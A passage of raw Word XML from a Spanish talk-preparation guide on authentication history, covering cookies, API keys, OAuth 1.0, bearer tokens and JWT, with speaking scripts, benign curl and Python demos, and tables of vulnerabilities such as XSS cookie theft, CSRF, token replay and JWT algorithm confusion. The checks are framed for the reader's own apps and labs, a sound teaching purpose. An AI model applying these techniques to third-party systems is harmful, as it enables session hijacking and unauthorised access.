          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>curl -b cookies.txt https://TU-APP/perfil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Vulnerabilidades y cómo comprobarlas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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Vulnerabilidad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Cómo se comprueba (autorizado/lab)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Cookie sin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HttpOnly</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> → XSS la lee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En un lab (PortSwigger XSS / Juice Shop) inyectá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document.cookie</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> y verificá que la sesión es accesible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Sin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SameSite</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> → CSRF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Lab de CSRF de PortSwigger: formulario que dispara una acción autenticada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Session fixation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En tu app: fijá vos el valor de la cookie antes del login y verificá si el servidor la respeta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Sesión no se invalida al logout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Reutilizá la cookie vieja tras logout: si sirve, no hay revocación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Falta de rotación de sesión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Compará el ID de sesión antes y después del login (debería cambiar)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Defensa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>HttpOnly</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>Secure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>SameSite</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, rotar el ID en el login, invalidar en el servidor al logout, tiempo de inactividad, tokens CSRF.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>M3 — API keys (mediados de los 2000)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Idea</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>No tienen RFC: son práctica de industria, popularizadas con la nube (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>access keys de AWS, 2006</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">). Identifican a un sistema, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no autentican a una persona</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, y por defecto </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no expiran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Guion para explicar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>"La API key es el bearer token más usado y menos cuidado del mundo. Es un identificador estático que se mete en un archivo, en una variable de entorno o —peor— en el JavaScript de un frontend, donde cualquiera lo lee. Identifica, no autentica."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Ejemplo que puedo hacer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curl -H "X-API-Key: TU_CLAVE_DE_PRUEBA" https://httpbin.org/headers</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Para mostrar extracción: en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu propia</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> web/app, DevTools → Network → buscá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>api_key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apikey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token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en las requests del cliente.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Escaneo de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tus propios</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> repos (no de terceros):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# gitleaks o ggshield sobre tu repo</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>gitleaks detect --source . -v</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Vulnerabilidades y cómo comprobarlas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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Vulnerabilidad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Cómo se comprueba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Clave hardcodeada en el cliente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DevTools/descompilar tu app; buscá el secreto en el bundle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Clave en el repositorio</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>gitleaks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ggshield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trufflehog</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> sobre tu repo/CI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Sin expiración ni rotación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Verificá que la clave sigue funcionando después de meses (tu entorno)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Sin scope ni límites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Usá la clave "de solo lectura" para intentar una operación de escritura en tu API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Sin rate limit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Enviá N requests a tu endpoint con la misma key y medí 429/423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Defensa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Rotación, revocación, scope, IP allowlist, rate limit, secret manager, detección en CI (secret scanning). Dato para citar: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>28,65 M de secretos nuevos en commits públicos de GitHub en 2025 (+34 %)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:hyperlink r:id="rId18">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">GitGuardian, State of Secrets Sprawl 2026</w:t>
        </w:r>
      </w:hyperlink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M4 — OAuth 1.0 (firma HMAC) (2007 / 2010)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Idea</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Antes del bearer, OAuth </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>firmaba cada request</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> con HMAC-SHA1 y un secreto compartido. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Especificación comunitaria, diciembre de 2007; RFC 5849, abril de 2010.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> El token no se puede copiar y reusar: la firma está atada al método, la URL y los parámetros. Es el ancestro conceptual de DPoP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Guion para explicar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>"OAuth 1.0 era la antítesis del bearer: nada de mandar un string reutilizable, cada request se firmaba. Más seguro en teoría, carísimo en la práctica: canonicalizar parámetros, secretos compartidos por cada par de servicios, y una pesadilla en móviles. El mundo eligió simplicidad y nació el bearer."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Ejemplo que puedo hacer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Construir la firma conceptualmente en Python (sin llamar a nadie):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import hmac, hashlib, base64, urllib.parse</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>method = "GET"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>url = "https://api.ejemplo.com/recurso"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>params = {"oauth_consumer_key": "key", "oauth_nonce": "abc123", "oauth_timestamp": "1700000000"}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>base = "&amp;".join([method, urllib.parse.quote(url, safe=""),</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                 urllib.parse.quote("&amp;".join(f"{k}={params[k]}" for k in sorted(params)), safe="")])</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>signature = base64.b64encode(hmac.new(b"secreto", base.encode(), hashlib.sha1).digest())</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print("oauth_signature =", urllib.parse.quote(signature))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Mostrá que cambiar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>un solo parámetro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> invalida la firma: eso es lo que el bearer no tiene.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Vulnerabilidades y cómo comprobarlas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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Vulnerabilidad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Cómo se comprueba (lab propio)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Errores de canonicalización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Alterá el orden/encoding de parámetros y observá si la firma valida o no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Secreto compartido filtrado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Si el secreto se filtra, se pueden firmar requests: probá en tu implementación de práctica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Sin anti-replay (nonce/timestamp)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Reenviá la misma request firmada dos veces contra tu lab: ¿la acepta?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Complejidad de implementación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Compará líneas de código vs. un flujo bearer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Defensa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Nonce + timestamp anti-replay, secretos por par, TLS. Hoy: migrar a DPoP en vez de reimplementar OAuth 1.0.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>M5 — Bearer token (OAuth 2.0) (2012)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2736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ranspor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7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95057"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Dónde viaja el token: cabecera, cookie o query</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Idea</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">OAuth 2.0 separa autorización de autenticación y entrega al cliente un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>access token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">: un string con alcance y vida. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC 6749, octubre de 2012</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">; su uso bearer, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC 6750, octubre de 2012</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. La regla: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>quien tiene el token, lo usa.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> La propia norma lo admite en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC 6749 §10.3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>"This specification does not provide any methods for the resource server to ensure that an access token presented to it by a given client was issued to that client by the authorization server."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Guion para explicar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>"El bearer ganó por simplicidad: un string en una cabecera, sin firmar cada request, sin secretos compartidos. El precio está escrito en la norma: el servidor de recursos no puede saber si quien presenta el token es a quien se le emitió. Ese es el corazón de esta clase."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Ejemplo que puedo hacer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# Con TU token (de tu cuenta / tu entorno)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -H "Authorization: Bearer TU_TOKEN" https://httpbin.org/bearer</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Inspeccionar la forma de la cabecera en DevTools de TU app</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Network -&gt; Request Headers -&gt; Authorization: Bearer eyJ...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Demostración de reutilización (sólo tu cuenta, tu entorno):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> copiá tu token a un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en otra terminal —atelada al mismo host de tu app— y comprobá que el servidor lo acepta sin más. Eso </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el punto de la charla; no lo hagas contra terceros.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Vulnerabilidades y cómo comprobarlas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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Vulnerabilidad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Cómo se comprueba (tu entorno)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Replay: el token no está atado al cliente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Copiá el token y usalo desde otro cliente (curl) contra tu API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Token en URL/query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Buscá tokens en logs, en el header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Referer</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> o en el historial (tu app)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Vida demasiado larga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Decodificá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exp</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> (JWT) o medí cuánto sigue vivo un token opaco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Sin revocación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Probá tu token después de "cerrar sesión": si sigue válido, no hay revocación (RFC 7009)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Sobre-privilegio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Pedí un token con scope amplio en tu client y usá un endpoint fuera del scope mínimo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Transporte inseguro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Verificá que tu API sólo acepta HTTPS y rechaza el token por HTTP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Defensa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Vida corta, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>aud</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> estricto, scope mínimo, revocación (RFC 7009) e introspección (RFC 7662), nunca en query (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC 9700, enero 2025</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> lo prohíbe), y sender-constrained (M9).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>M6 — JWT (2010 / 2015)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2961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jwt_anatom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9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95057"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Anatomía de un JWT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Idea</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>JWT (JSON Web Token)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>header.payload.signature</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, base64url. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Primer borrador: 28 de diciembre de 2010; RFC 7519, mayo de 2015</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (familia JOSE: JWS 7515, JWE 7516, JWK 7517, JWA 7518). El payload </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no está cifrado</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">: está firmado. El header trae </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>alg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>kid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Guion para explicar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">"Un JWT es como una credencial plastificada: firmada, no sellada. Cualquiera lee el contenido. Y guarda una trampa: el header dice con qué algoritmo se firmó; si el validador le hace caso al token en lugar de a su configuración, el atacante elige el algoritmo. De ahí salen </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>alg: none</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, la confusión RS256→HS256 y la inyección de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>kid</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Ejemplo que puedo hacer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Generá y decodificá tu propio JWT (nada de terceros):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# pip install pyjwt</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import jwt</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
